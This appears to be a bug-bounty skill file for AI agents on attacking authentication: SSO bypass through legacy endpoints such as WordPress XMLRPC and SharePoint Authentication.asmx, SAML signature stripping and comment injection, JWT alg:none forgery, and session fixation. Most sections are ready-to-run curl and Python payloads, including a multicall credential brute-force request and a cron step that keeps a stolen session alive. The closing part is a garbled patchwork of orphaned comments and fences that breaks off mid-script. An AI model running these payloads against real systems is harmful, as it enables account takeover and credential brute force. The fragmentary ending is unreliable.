---
name: authentication-testing
description: Comprehensive authentication testing: auth bypass, JWT attacks, session management, MFA bypass, password reset poisoning. Real-world bounty chains.
---

## Crown Jewel Targets

Auth bypass is consistently one of the highest-paying vulnerability classes in bug bounty because it directly violates the most fundamental security control. High-value targets include:

- **SSO/SAML implementations** at enterprise SaaS companies (Slack, Okta, OneLogin integrations) — payouts regularly in the $5K–$25K+ range
- **Admin panels and partner/internal portals** — subdomain-separated admin surfaces like `partners.shopify.com`, `admin.company.com`
- **Third-party auth plugin integrations** — WordPress plugins (OneLogin, WP-SAML-Auth), Drupal SSO modules, any CMS with pluggable auth
- **XMLRPC endpoints** on WordPress — often forgotten, bypasses standard WP auth flows entirely
- **OAuth callback flows** — state parameter mishandling, redirect_uri mismatches
- **API authentication layers** — especially where auth was bolted on after the fact

**Asset priority:** Targets with federated identity (SAML, OAuth, OIDC) connected to large user populations. Partner/reseller portals are particularly juicy because they often have elevated permissions and less security scrutiny than the main product.

---

## Attack Surface Signals

**URL patterns to hunt:**
```
/xmlrpc.php
/wp-login.php
/saml/
/sso/
/auth/saml/callback
/oauth/callback
/partners.*
/admin.*
/?wc-api=
/api/v*/auth
/login?redirect=
/accounts/login
```

**Response headers signaling SSO:**
```
X-Frame-Options: SAMEORIGIN (common on SSO portals)
Set-Cookie: SAMLResponse=
Location: https://idp.company.com/saml
WWW-Authenticate: Bearer realm="partners"
```

**JS patterns indicating federated auth:**
```javascript
// Look for in page source
samlRequest
RelayState
SAMLResponse
onelogin
shibboleth
okta
passport.js authenticate
```

**Tech stack signals:**
- WordPress + any SSO plugin → check XMLRPC separately
- Shopify Partner API exposure → cross-tenant privilege escalation risk
- Any app advertising "SSO enabled" or "Login with [Enterprise IdP]"
- Separate subdomains for admin/partner that share session cookies with main domain
- Applications using `SimpleSAMLphp`, `ruby-saml`, `python-saml`

**Burp passive scan triggers:**
- `SAMLResponse` in any POST body
- `openid_connect` or `id_token` in responses
- Cookie domains set to `.company.com` (wildcard)

---

## Step-by-Step Hunting Methodology

1. **Map all authentication entry points**
   - spider the target for every login surface: main login, admin login, API login, partner portal, mobile API endpoints
   - check `robots.txt`, JS files, and the wayback machine for forgotten endpoints like `/xmlrpc.php`

2. **Identify the auth mechanism per entry point**
   - Is it forms-based, SAML, OAuth, API key, session token?
   - For WordPress: always probe `/xmlrpc.php` even if the main login is SSO-protected

3. **Test XMLRPC independently of SSO**
   - If site uses SSO (e.g., OneLogin), manually POST to `/xmlrpc.php`
   - XMLRPC uses WordPress-native credentials, not SSO — test with `system.listMethods` first, then `wp.getUsersBlogs`

4. **Enumerate SAML implementation**
   - Capture a valid SAMLResponse via Burp
   - Decode the Base64 payload, inspect the XML
   - Test signature stripping, comment injection, and XML wrapping attacks
   - Test if SP validates the signature at all (send unsigned assertion)

5. **Test cross-portal session/token reuse**
   - Log into `partners.shopify.com` type portals
   - Attempt to use the issued token/cookie against the main admin portal
   - Look for shared cookie domains, shared JWT secrets, or API tokens that work across contexts

6. **Fuzz auth parameters**
   - Null/empty passwords, `password[]=array`, SQL in username field
   - Try `admin`/`admin`, `test`/`test` on staging subdomains
   - Modify `role`, `is_admin`, `user_type` in JWTs (none algorithm, weak secret)

7. **Check redirect and state parameters**
   - Does removing `state` from OAuth break anything?
   - Can you change `redirect_uri` to an open redirect target?
   - Does the `RelayState` in SAML get validated?

8. **Verify impact by escalating privileges**
   - Don't stop at login — prove you can access admin functions, other users' data, or sensitive configuration
   - Screenshot the highest-privilege action you can perform

---

## Legacy-Protocol Matrix (Probe These First on Any Custom-Branded Login)

When a target has a custom, branded login UI (e.g. `customlogin.aspx`, `/auth/signin`, `/account/login`), **always probe the platform's legacy protocol endpoints with native credentials** in parallel. These endpoints frequently outlive the custom UI's protections and accept native credentials with NO rate limit, NO MFA challenge, NO CAPTCHA, NO anti-automation. This is the WordPress XMLRPC pattern generalised across CMS / portal / framework stacks.

| Target tech | Legacy endpoint(s) to probe | Native-cred bypass surface |
|---|---|---|
| **WordPress** | `/xmlrpc.php` (`system.listMethods`, `wp.getUsersBlogs`, `system.multicall`) | Native WP user/pass; bypasses SSO, MFA, IP-allow rules on `/wp-login.php` |
| **WordPress (REST)** | `/?rest_route=/wp/v2/users`, `/wp-json/wp/v2/users` | User enumeration anonymously even when login page is hardened |
| **SharePoint (any version)** | `/_vti_bin/Authentication.asmx` (`Mode` + `Login` SOAP ops) | Native Forms-auth credential; FedAuth cookie returned; no rate limit on this endpoint observed on SP2013 farms — **this is the canonical SP equivalent of the WP XMLRPC bypass** |
| **SharePoint legacy** | `/_vti_bin/_vti_aut/author.dll`, `/_vti_bin/_vti_adm/admin.dll`, `/_vti_bin/owssvr.dll` | FrontPage RPC; sometimes still wired to credential validators |
| **SharePoint REST** | `/_api/contextinfo` (POST), `/_api/$metadata` | Anonymous FormDigest issuance; full API surface enumeration |
| **Atlassian (Jira / Confluence)** | `/rest/auth/1/session` (basic-auth), `/rest/api/2/myself`, legacy `/rest/api/1.0/` | Native credentials accepted on `/rest/auth/1/session` even when Atlassian Crowd / Atlassian Access SSO is enforced on the UI |
| **Drupal** | `/jsonapi/`, `/user/login?_format=json` | JSON POST endpoint that accepts native passwords; separate from SSO middleware |
| **Drupal (D7 legacy)** | `/?q=user/login`, `/services/`, `/rest/` | Older REST modules with independent auth |
| **Joomla** | `/administrator/index.php?option=com_login`, `/api/index.php/v1/users` | Native Joomla credentials accepted on admin entry independent of any front-site SSO |
| **Exchange / OWA** | `/EWS/Exchange.asmx`, `/Autodiscover/Autodiscover.xml`, `/Microsoft-Server-ActiveSync` | NTLM / Basic; bypasses OWA UI restrictions (MFA, IP-allow). The classic CVE-2020-0688 / CVE-2021-26855 surface |
| **Citrix NetScaler** | `/vpn/index.html`, `/cgi/login`, `/nf/auth/doAuthentication.do` | Native AD credentials; independent of MFA wrappers |
| **F5 BIG-IP** | `/mgmt/tm/util/bash`, `/tmui/login.jsp` | Native admin credentials |
| **Generic ASP.NET app** | `*.asmx?WSDL`, `*.svc?WSDL`, `trace.axd`, `elmah.axd`, `.disco` | Find every web service; many take credentials independently of the WebForms login |
| **Spring Boot** | `/actuator/*`, `/management/*`, `/api/v1/auth/login`, `/api/v1/swagger-ui` | Actuator endpoints sometimes anonymously enumerable |
| **Jenkins** | `/jnlpJars/jenkins-cli.jar`, `/script`, `/manage`, `/computer/(master)/script` | API tokens + native auth |
| **GitLab** | `/api/v3/*` (deprecated but still on old installs), `/api/v4/users`, `/api/v4/projects` | Personal Access Tokens with looser scoping than UI session |
| **TeamCity** | `/app/rest/users`, `/login.html?username=&password=` (GET-form-login) | Native admin credentials |
| **Apache Tomcat** | `/manager/html`, `/host-manager/html`, `/manager/text/list` | Native Tomcat realm credentials independent of any front auth |
| **WebLogic** | `/console/login/LoginForm.jsp`, `/wls-wsat/*` | Native admin |
| **Oracle EBS / PeopleSoft** | `/OA_HTML/AppsLogin`, `/psp/*/?cmd=login` | Native ERP credentials |

**How to use:**
1. Identify the tech stack from headers + paths (use `hunt-misc` Attack Surface Signals).
2. Find the row above that matches.
3. Probe the legacy endpoint anonymously to confirm it's reachable and not 403/404.
4. Test with synthetic credentials to confirm it accepts native credential format and returns differential responses (success vs failure).
5. Verify there is no rate limit, no lockout, no CAPTCHA — burst 10 requests at the same user, confirm uniform timing.
6. Report as **Critical / High** depending on chain to ATO: an anonymous + unlimited credential brute-force endpoint is consistently Critical on bug-bounty programs.

**Lesson from a authorized engagement:** A an enterprise dealer portal on SharePoint 2013 had a custom branded `customlogin.aspx`. The hunt-auth-bypass skill was loaded but the matrix above did not exist in this document — and the WordPress XMLRPC pattern was not connected to the SharePoint equivalent. `/_vti_bin/Authentication.asmx` was reachable anonymously, accepted unlimited credential attempts with no rate limit and no lockout, and was the highest-impact finding in the engagement. Walking this matrix on the first pass would have surfaced it immediately.

---

## Payload & Detection Patterns

**XMLRPC auth probe (bypasses SSO):**
```bash
curl -s -X POST https://target.com/xmlrpc.php \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?>
<methodCall>
  <methodName>system.listMethods</methodName>
  <params></params>
</methodCall>'

# If 200 with method list → XMLRPC is enabled, test auth:
curl -s -X POST https://target.com/xmlrpc.php \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?>
<methodCall>
  <methodName>wp.getUsersBlogs</methodName>
  <params>
    <param><value><string>admin</string></value></param>
    <param><value><string>password</string></value></param>
  </params>
</methodCall>'
```

**SAML signature stripping (send unsigned assertion):**
```python
import base64, re

# Decode captured SAMLResponse
saml_b64 = "BASE64_FROM_BURP"
saml_xml = base64.b64decode(saml_b64).decode()

# Strip the Signature element entirely
stripped = re.sub(r'<ds:Signature.*?</ds:Signature>', '', saml_xml, flags=re.DOTALL)

# Re-encode and submit
print(base64.b64encode(stripped.encode()).decode())
```

**SAML XML comment injection (username confusion):**
```xml
<!-- Original NameID -->
<NameID>attacker@evil.com</NameID>

<!-- Injected to confuse parser -->
<NameID>attacker@evil.com<!---->.victim@company.com</NameID>

<!-- Or namespace confusion -->
<NameID xmlns:evil="http://evil.com">victim@company.com</NameID>
```

**Partner/cross-portal token reuse test:**
```bash
# Get token from partner portal
TOKEN=$(curl -s -X POST https://partners.target.com/login \
  -d 'email=attacker@test.com&password=pass' \
  -c cookies.txt | grep -o 'token=[^;]*')

# Replay against admin portal
curl -s https://admin.target.com/dashboard \
  -H "Authorization: Bearer $TOKEN" \
  -H "Cookie: $TOKEN"
```

**JWT none algorithm attack:**
```python
import base64, json

header = base64.b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).decode().rstrip('=')
payload = base64.b64encode(json.dumps({"user_id":1,"role":"admin","email":"victim@company.com"}).encode()).decode().rstrip('=')
token = f"{header}.{payload}."
print(token)
```

**Grep patterns for auth bypass surface:**
```bash
# Find XMLRPC in scope
grep -r "xmlrpc" scope_urls.txt

# Find SSO indicators in JS
grep -rE "(SAMLResponse|samlRequest|RelayState|onelogin|shibboleth)" *.js

# Find partner/admin subdomains
subfinder -d target.com | grep -E "(admin|partner|internal|sso|auth|login)"
```

---

## Common Root Causes

1. **SSO bypasses local auth entirely at the UI layer, but not at the API layer** — developers disable the login form but forget that API endpoints (`/xmlrpc.php`, REST API, mobile API) have their own auth handlers that still accept native credentials.

2. **SAML signature validation is skipped or optional** — library defaults often don't enforce signature checking; developers use `wantAssertionsSigned: false` or fail to configure the IdP certificate correctly.

3. **Shared session infrastructure across different trust levels** — partner portals and admin portals reuse the same session cookie or JWT secret because they're built on the same internal framework, assuming access control at the application layer is sufficient.

4. **Trust inheritance in multi-tenant architectures** — a token issued in a lower-privilege context (partner, reseller) is accepted in a higher-privilege context because the verification only checks signature validity, not the issuance context.

5. **Plugin/module auth is independent of application auth** — every WordPress plugin that handles auth (contact forms, REST API extensions, WooCommerce) may implement its own auth handler inconsistently with the main site's SSO.

6. **XML parsing inconsistencies** — different XML parsers (used by SP vs. IdP) handle comments, namespaces, and whitespace differently, enabling confusion attacks where the signed content differs from the evaluated content.

---

## Bypass Techniques

| Defense | Bypass |
|---|---|
| SSO enforced on login page | Probe alternate entry points: XMLRPC, REST API, mobile API, legacy endpoints |
| SAML signature validation | XML comment injection, namespace wrapping, signature wrapping (XSW), remove signature entirely |
| IP allowlisting on admin portal | Use partner portal token if it shares auth backend |
| Rate limiting on login | XMLRPC allows credential stuffing via `system.multicall` — batches hundreds of auth attempts in one request |
| CSRF token on login form | SAML flow is POST-based cross-origin by design; no CSRF token needed on `/saml/callback` |
| JWT signature validation | `alg: none`, key confusion (RS256 → HS256 with public key as secret), brute-force weak secrets |
| Separate session stores per portal | Check if cookie domain is `.target.com` (wildcard) — cookie bleeds between subdomains |
| MFA on primary login | If SAML SP doesn't enforce MFA at the assertion level and accepts pre-auth assertions, MFA can be skipped |

**XMLRPC multicall for mass auth bypass:**
```xml
<methodCall>
  <methodName>system.multicall</methodName>
  <params><param><value><array><data>
    <value><struct>
      <member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>
      <member><name>params</name><value><array><data>
        <value><string>admin</string></value>
        <value><string>password1</string></value>
      </data></array></value></member>
    </struct></value>
    <!-- repeat for each credential pair -->
  </data></array></value></param></params>
</methodCall>
```

---

## Gate 0 Validation

Before writing any report, answer these three questions:

1. **What can the attacker DO right now?**
   Must be: authenticate as another user OR authenticate without valid credentials OR elevate to admin/privileged role. "Partial information disclosure" is not auth bypass.

2. **What does the victim LOSE?**
   Must identify a concrete asset: account takeover of specific user, access to all admin functions, ability to read/modify other tenants' data, or access to privileged APIs. Abstract "security control bypass" without impact is not sufficient.

3. **Can it be reproduced in 10 minutes from scratch?**
   You must be able to: (a) start from a fresh browser/session, (b) follow your exact steps, and (c) arrive at authenticated access to a protected resource. If reproduction requires special preconditions you can't re-create (a specific victim's active session, timing windows), the report needs more work.

---

## Real Impact Examples

**Scenario 1 — SSO Enforcement Bypassed via Forgotten Protocol Endpoint**
A large ride-sharing company enforced SSO (via OneLogin) on all WordPress-based internal/public properties. The XMLRPC endpoint (`/xmlrpc.php`) remained active and accepted WordPress-native credentials entirely independent of the SSO flow. An attacker with any valid WP-native credentials (obtained via credential stuffing or from a previous breach) could authenticate directly through XMLRPC, bypassing MFA, SSO policies, and IP restrictions enforced on the main login form. Impact: Full authenticated access to all WordPress functions available to that user role, including content management and potentially admin functions.

**Scenario 2 — SAML Assertion Forgery via Signature Validation Failure**
A major enterprise communication platform's SAML SP implementation failed to properly validate assertion signatures in specific edge cases. By manipulating the XML structure of a captured SAMLResponse (specifically through comment injection or namespace prefix attacks), an attacker could modify the `NameID` value to impersonate any user in an organization — including workspace administrators — without possessing that user's credentials or private key material. Impact: Complete account takeover of any user within a SAML-enabled organization; attacker gains access to all messages, files, and integrations in the workspace.

**Scenario 3 — Cross-Portal Privilege Escalation via Shared Auth Backend**
An e-commerce platform's partner/reseller portal issued authentication tokens that were validated by the same backend service as the merchant admin portal. A partner-level account (lower trust, external-facing) could use its issued credentials or tokens to authenticate directly against admin-tier API endpoints, bypassing the merchant onboarding and permission assignment flow. Impact: A malicious partner could access any merchant's admin panel, modify store configurations, exfiltrate customer PII and payment data, or install malicious scripts — affecting thousands of merchant storefronts.

---

## Disclosed Report Citations (Backfill +8 — 2016-2025)

The following real, verified bug-bounty / coordinated-disclosure cases extend this skill. Spans 4 SAML subclasses, 4 JWT subclasses, 1 legacy-protocol (XMLRPC), and 2 partner-portal cross-domain reuse patterns.

5. **GitHub Enterprise Server — SAML XSW via parser differential (CVE-2025-25291/25292)** ([H1 #2579939](https://hackerone.com/reports/2579939) · [Blog](https://github.blog/security/sign-in-as-anyone-bypassing-saml-sso-authentication-with-parser-differentials/))
    - Subclass: SAML signature stripping / XSW (parser-differential variant)
    - Payload: signed SAML response; inject a sibling `<Assertion>` so REXML (signature-checker) and Nokogiri (business-logic reader) resolve different nodes via the same XPath. Signature validates against benign node; SP consumes attacker-controlled `<NameID>admin@target</NameID>`
    - Root cause: two XML parsers used for verification vs consumption return different elements for the same XPath
    - Year: 2025 — GitHub Security Lab bounty (program max class, internally rated Critical)

6. **GitHub Enterprise — SAML signature bypass on encrypted assertions (CVE-2024-4985)** ([H1 #2475347](https://hackerone.com/reports/2475347) · [ProjectDiscovery advisory](https://projectdiscovery.io/blog/github-enterprise-saml-authentication-bypass))
    - Subclass: SAML signature stripping (XSW family) when encrypted-assertions feature enabled
    - Payload: forge SAML response with attacker-controlled assertion; exploit improper signature verification on the encrypted-assertion code branch; provision arbitrary user including `site_admin`
    - Root cause: improper cryptographic signature verification on the encrypted-assertion code branch
    - Year: 2024 — bounty undisclosed, CVSS 10.0

7. **Uber — SAML auth bypass on `uchat.uberinternal.com`** ([H1 #223014](https://hackerone.com/reports/223014))
    - Subclass: SAML signature stripping / improper assertion verification (OneLogin SP-side)
    - Payload: replay/modify SAML assertion with forged `NameID`; SP did not strictly validate signature scope, so attacker-controlled assertion accepted, granting OneLogin SSO session to internal chat
    - Root cause: improper SAML signature verification on SP implementation
    - Year: 2017 — **$8,500**

8. **Uber — OneLogin SSO bypass via WordPress XMLRPC** ([H1 #138869](https://hackerone.com/reports/138869))
    - Subclass: WordPress XMLRPC bypassing SSO (legacy-auth path not gated) — canonical Legacy-Protocol Matrix case
    - Payload: OneLogin plugin auto-created WP users with literal password `@@@nopass@@@`. SSO plugin blocked `wp-login.php` only. POST `xmlrpc.php` with `wp.getUsersBlogs` + known shared password → authenticated as any previously-SSO'd user
    - Root cause: SSO enforcement applied at one auth surface (wp-login) but legacy XML-RPC path retained password auth with a guessable shared password
    - Year: 2016 — **$7,000**

9. **Slack — SAML "confused-deputy" assertion reuse** ([Writeup](http://blog.intothesymmetry.com/2017/10/slack-saml-authentication-bypass.html))
    - Subclass: partner-portal / cross-IdP assertion reuse (audience-restriction not validated)
    - Payload: take an old expired GitHub-signed SAML assertion (different audience, different subject) → present to Slack ACS → Slack logs attacker in as the asserted username
    - Root cause: no audience-restriction nor freshness check; trust extended across IdPs
    - Year: 2017 — **$3,000**

10. **HackerOne — SAML signup domain enforcement bypass via control characters** ([H1 #2101076](https://hackerone.com/reports/2101076))
    - Subclass: partner-portal / SAML domain-binding bypass via unicode control characters
    - Payload: new user sign-up at SAML-enforced org; append trailing control character (e.g., `\r`, ` `) to email → domain comparison normalises away, signup proceeds → unauthorised access to the org
    - Root cause: inconsistent unicode/control-char normalisation between domain check and identity write
    - Year: 2024 — bounty awarded (amount undisclosed)

11. **8x8 / Jitsi-Meet — JWT alg-confusion (asymmetric verifier accepts symmetric alg)** ([H1 #1210502](https://hackerone.com/reports/1210502))
    - Subclass: JWT alg-confusion (RS256 → HS256 using public key as HMAC secret)
    - Payload: server publishes RS256 verification public key. Send a token with header `{"alg":"HS256"}` signed with that public key as the HMAC secret → Prosody module validates and admits attacker into authenticated/moderator room
    - Root cause: verifier did not enforce `alg=RS256`; allowed symmetric algorithm using the public key as shared secret
    - Year: 2021 — bounty undisclosed

12. **Argo CD (Internet Bug Bounty) — JWT audience claim not validated (CVE-2023-22482)** ([H1 #1889161](https://hackerone.com/reports/1889161))
    - Subclass: token-scope / audience check at issuance not at use (cross-audience token confusion)
    - Payload: obtain any RS256-signed token signed by the cluster's OIDC issuer but minted for a different `aud` (e.g., `kubernetes`) → present it as bearer to Argo CD API → API treats it as valid because it accepted the issuer's signature and skipped `aud` enforcement
    - Root cause: `aud` claim not enforced; signature-trust extended across audiences
    - Year: 2023 — **$2,400** via IBB

---

## Duende BFF — Token-Confusion & Session-Fixation (2024-2026 surface)

Duende BFF deployments expose two distinct auth-bypass families beyond the CSRF angle covered in `hunt-csrf`. Both are documented architectural realities, not unicorn CVEs.

### Attack class 1 — YARP `UserOrClient` / `UserOrNone` privilege escalation

`Duende.BFF.Yarp` attaches access tokens to proxied routes via `WithAccessToken(TokenType.X)` metadata. The **misconfig pattern**: developer marks a route `UserOrClient` (use user token if logged in, else fall back to *client-credentials* token) intending it for a "public catalog" endpoint. The client-credentials (M2M) token frequently has broader scope (`api.admin`, `internal.read`) than any user token. An **unauthenticated** attacker hitting that route gets the request proxied with the **service-account token attached** to the downstream API — privilege escalation by design when the downstream trusts the bearer.

**Payload shape:** identify a BFF route marked `TokenType.UserOrClient` (visible via 401-vs-200 differential when no session, or via leaked OpenAPI/NSwag spec). Hit it with no cookies → BFF forwards with M2M token granting admin-scope downstream. ([docs.duendesoftware.com/bff/fundamentals/apis/yarp](https://docs.duendesoftware.com/bff/fundamentals/apis/yarp/))

**Adjacent confirmed CVE:** **CVE-2024-51987** in `Duende.AccessTokenManagement.OpenIdConnect` — *"HTTP client uses incorrect token after refresh"* — materially the same family of token-confusion at the proxy layer. Moderate severity, fixed 2024. ([GHSA-...51987](https://github.com/advisories?query=duende))

### Attack class 2 — Cookie-domain wildcard + sliding expiration = persistent ATO

When BFF session cookie has `Domain=.example.com` (devs do this to share login across `app.` and `admin.`), the `__Host-` prefix protection is dropped. Any sibling subdomain — including a **taken-over** one (`legacy.example.com` CNAMEd to deprovisioned Heroku/S3) — can write `Set-Cookie: .AspNetCore.Cookies=<attacker_session>; Domain=.example.com`. Victim hits `app.example.com` carrying the attacker's session = **session-fixation ATO**.

If `SlidingExpiration=true` (default) and `ExpireTimeSpan` is large (e.g. 8h), an exfiltrated cookie remains valid and keeps sliding forward as long as the attacker periodically calls `/bff/user`. There is no server-side refresh-token rotation check on the cookie itself — only the OIDC token (server-side) rotates. Persistent ATO window per stolen cookie.

**Payload shape:** subdomain takeover → write the BFF session cookie with `Domain=.example.com` → victim's next visit to `app.example.com` adopts attacker's session. Cron-curl `GET /bff/user -H 'X-CSRF: 1' -b '.AspNetCore.Cookies=...'` every 6h indefinitely to keep the session alive.

**Hardening reference:** [docs.duendesoftware.com/bff/fundamentals/session/handlers](https://docs.duendesoftware.com/bff/fundamentals/session/handlers/), [nestenius.se BFF cookie guide](https://nestenius.se/net/bff-in-asp-net-core-3-the-bff-pattern-explained/), [Langkemper on `__Host-` prefix](https://www.sjoerdlangkemper.nl/2017/02/09/cookie-prefixes/).

### Attack class 3 — `/bff/user` claim disclosure

`GET /bff/user` returns the **full claim set** of the active session as a JSON array — `sub`, `sid`, `email`, `bff:session_expires_in`, `bff:session_state`, `bff:logout_url`, plus every custom claim the OP issued (department, role, internal employee ID, tenant ID). The endpoint is gated only by session cookie + `X-CSRF: 1`. If `AnonymousSessionResponse=Response200` is set, the endpoint also acts as a session probe (200 + claims vs 200 + `null`) usable as an auth-state oracle. Low/Medium info-disclosure on its own; valuable as recon for the YARP token-confusion class above. ([docs.duendesoftware.com/bff/fundamentals/session/management/user](https://docs.duendesoftware.com/bff/fundamentals/session/management/user/))

### Evidence strength + reporting tip

No Duende.BFF-direct CVE exists. The three classes are exploitable via real-world misconfigurations; CVE-2024-51987 and CVE-2025-26620 in the adjacent `Duende.AccessTokenManagement` packages make token-confusion a confirmed family. **Report by chain impact** (e.g., "low-priv session reaches admin-scope downstream API via UserOrClient route" → Critical) rather than by CVE citation, since the issue is design-level.

Cross-references for the chain:
- `hunt-csrf` — the role-partitioned antiforgery class (the CSRF angle on the same BFF surface).
- `hunt-subdomain-takeover` / `hunt-subdomain` — required primitive for the cookie-domain attack.

---

## Function-Level Access Control (Broken Authorization)

Authentication bypass gets you *in*; **function-level access control** failures let an already-authenticated low-privilege user reach privileged *functions* the UI never offered them. This is the authorization sibling of `hunt-idor` (object-level access) — test both whenever you hold any authenticated session.

**The sibling-function rule:** if 9 endpoints under a path enforce auth/role middleware, the 10th that doesn't is your bug. Admin route families are the highest-yield place to look:

```
/api/admin/users   → has auth middleware
/api/admin/export  → often MISSING it
/api/admin/delete  → often MISSING it
/api/admin/reset   → often MISSING it
```

**Anti-patterns to grep for:**
```javascript
// Missing middleware on a sibling route
router.get('/admin/users',  authenticate, authorize('admin'), getUsers);
router.get('/admin/export', getExport);            // No middleware!

// Client-side role check only — server never re-checks
if (user.role === 'admin') showAdminButton();      // frontend gate
app.post('/api/admin/delete', deleteUser);         // no server-side check
```

**How to hunt:** enumerate every privileged endpoint (admin/export/delete/reset/impersonate, GraphQL admin queries), then replay each from a *regular* authenticated session — and again with no session. A 200 (or a differential vs the 403 its siblings return) is broken function-level access control.

**Real paid example — HackerOne TrustHub:** `POST /graphql` with the `TrustHubQuery` operation had no authorization check — a regular user could read all vendors' data (CVSS 8.7, High). The object-level variant (e.g. a WebSocket `get_history` accepting an arbitrary UUID with no ownership check) belongs to `hunt-idor`.

---

## Related Skills & Chains

- **`hunt-idor`** — Auth bypass without object-level access is half a finding; pair them. Chain primitive: legacy `/v1/users/{id}` route missing both auth middleware AND ownership check = unauthenticated cross-tenant data read via direct ID substitution → full PII dump from "I am nobody" starting position.
- **`hunt-ato`** — Auth-bypass primitives feed the ATO funnel. Chain primitive: XMLRPC native-cred acceptance + no rate limit on `wp.getUsersBlogs` → credential-stuff with breach corpus from `hunt-misc` recon → `system.multicall` batches 1000 cred pairs per request → one valid pair = ATO bypassing the SSO + MFA the UI enforces.
- **`hunt-sharepoint`** — The SP equivalent of the WordPress XMLRPC pattern lives here. Chain primitive: `/_vti_bin/Authentication.asmx` anonymous reachable + native Forms-auth credential accepted + zero rate limit = unlimited credential brute-force endpoint bypassing custom-branded `customlogin.aspx` protections → FedAuth cookie → full SharePoint farm access.
- **`security-arsenal`** — Pull the JWT-attack payloads section (alg=none, kid path-traversal, JWK injection, RS256→HS256 key confusion) when JWT validation is the auth wall; pull the SAML signature-stripping section when the SP accepts unsigned assertions.
- **`triage-validation`** — Run the Pre-Severity Gate before claiming Critical on an "auth bypass" that only enumerates usernames or only reveals a 401-vs-403 differential. Username enumeration alone without lockout-amplification is consistently N/A or Informational on H1.

---


## Grounding — patterns that shaped each phase

No invented CVE/report IDs below. These are the *named, publicly-documented* patterns this skill encodes:

- **Session fixation, login-CSRF, no-regeneration-on-auth** — OWASP WSTG-SESS-03 / WSTG-SESS-01; the classic ACROS / Mitja Kolšek session-fixation paper. Highest-impact variant: fixing the session of an SSO/admin user.
- **SameSite=Lax sibling-subdomain CSRF reaching session state** — Argo CD **CVE-2024-22424** (Lax cookies sent on top-level cross-site navigations from a sibling subdomain). Use this when a session cookie relies on `SameSite=Lax` as its only CSRF defence.
- **Refresh-token rotation & automatic reuse-detection** — the Auth0/IETF OAuth-Security-BCP model: a rotated refresh token, if replayed, must invalidate the *entire token family*. Absence = the core bug to prove.
- **Device Bound Session Credentials (DBSC)** — the W3C/Chrome DBSC draft binds a session to a TPM/device key. Test the *downgrade*: does the server still accept a non-bound cookie when the DBSC challenge is stripped?
- **Cookie attribute hardening** — OWASP WSTG-SESS-02; `__Host-`/`__Secure-` prefixes per RFC 6265bis. Missing `HttpOnly` is only a finding when a real XSS/DOM sink exists (chain with `hunt-xss`/`hunt-dom`).
- **Entropy** — NIST SP 800-63B requires ≥64 bits of entropy in a session identifier. Treat anything decodable to a counter/timestamp/userId as a finding regardless of length.

Cross-refs: ATO chaining → `hunt-ato`; JWT alg/kid tampering → `hunt-api-misconfig`; OAuth code/state flaws → `hunt-oauth`; CSRF mechanics → `hunt-csrf`; cookie-theft sinks → `hunt-xss` / `hunt-dom`.

---


# Header signals worth flagging immediately:
Set-Cookie: session=abc; Path=/                 # no HttpOnly/Secure/SameSite
Set-Cookie: session=abc; SameSite=None          # None without Secure = rejected by modern browsers, but flag
Set-Cookie: __Host-sess=...; Secure; Path=/     # GOOD — hard to fixate
Sec-Session-Registration: ...                   # DBSC in play → test downgrade
```

---


# cookie name (sid/JSESSIONID/connect.sid/PHPSESSID/...). Prints name=value.
get_cookie () {  # $1=jar  $2=name-regex (default: common session names)
  local jar="$1" re="${2:-session|sid|sess|JSESSIONID|connect\.sid|PHPSESSID|laravel_session}"
  awk -v re="$re" '
    /^#HttpOnly_/ { sub(/^#HttpOnly_/,""); }   # strip jar HttpOnly marker
    /^#/ { next }                              # skip remaining comments
    NF>=7 && $6 ~ re { print $6"="$7 }         # field6=name field7=value
  ' "$jar" | tail -1
}
```


# Step 1: grab a pre-auth session the SERVER hands an anonymous client.
curl -s -L -c "$JAR_A" "https://$TARGET/login" -o /dev/null
PRE=$(get_cookie "$JAR_A"); echo "pre-auth: $PRE"


# Step 1b (stronger): can we FORCE an arbitrary ID? attacker-chosen value.
FIX="session=AAAAdeadbeefAAAA"


# Step 2: authenticate while CARRYING the pre-auth/forced cookie (reuse same jar).
curl -s -L -c "$JAR_A" -b "$JAR_A" -X POST "https://$TARGET/login" \
  -d "username=attacker@example.com&password=CorrectHorse1" -o /dev/null
POST=$(get_cookie "$JAR_A"); echo "post-auth: $POST"


#    (attacker controls the ID; no email/XSS needed to plant it).
AUTH=$(curl -s -L -b "$JAR_A" "https://$TARGET/api/me")
echo "$AUTH" | head -c 200
```
**FP guard:** a value *change* is not automatically safe — some apps rotate the readable cookie but keep a stable server-side session keyed by a second cookie. Diff the FULL `Set-Cookie` set and confirm the *old* value is genuinely dead (Phase 2). Also confirm `/api/me` returns *your* identity, not a generic 200/landing page.


# A logs in for real (fresh jar), capture A's live session.
curl -s -L -c "$JAR_A" -X POST "https://$TARGET/api/login" \
  -H 'Content-Type: application/json' \
  -d '{"email":"attacker@example.com","password":"CorrectHorse1"}' -o /dev/null
A=$(get_cookie "$JAR_A"); echo "A=$A"


# Baseline: what does an authenticated /api/me look like for A? (capture body, not just code)
BEFORE=$(curl -s -L -b "$JAR_A" "https://$TARGET/api/me")


# Logout A.
curl -s -L -b "$JAR_A" -X POST "https://$TARGET/api/logout" -o /dev/null


# overwritten it). Compare body + code against the authenticated baseline.
AFTER=$(curl -s -L -H "Cookie: $A" "https://$TARGET/api/me" -w '\n[%{http_code}]')
echo "AFTER: $AFTER"
```
**FP discipline (mandatory):**
- Don't trust the status code. A cached/edge 200 or a generic SPA shell returns 200 for everyone. **Body-diff** `AFTER` against `BEFORE` — the finding is only real if `AFTER` still contains A's *unique identity marker* (email, user-id, CSRF token, account name).
- Confirm with a **negative control**: a random/garbage cookie value must NOT return the same authenticated body. If garbage also yields 200 with user data, the endpoint isn't session-gated and there's no finding here.
- Re-test after a **short delay** and from a **different IP** — some servers lazily expire on next access or pin sessions to IP.


### Phase 3 — Invalidation on Password / Email Change (persistent-ATO core)
```bash


# (In a real engagement A is a session you legitimately captured for a TEST account


# 1) Log the TEST account in as session A, capture it.
curl -s -L -c "$JAR_A" -X POST "https://$TARGET/api/login" \
  -H 'Content-Type: application/json' \
  -d '{"email":"victim@example.com","password":"OldPass!1"}' -o /dev/null
SESSION_A=$(get_cookie "$JAR_A"); echo "SESSION_A=$SESSION_A"
BEFORE=$(curl -s -L -H "Cookie: $SESSION_A" "https://$TARGET/api/profile")


# 2) Log the SAME account in as session B (separate jar = "the victim's browser").
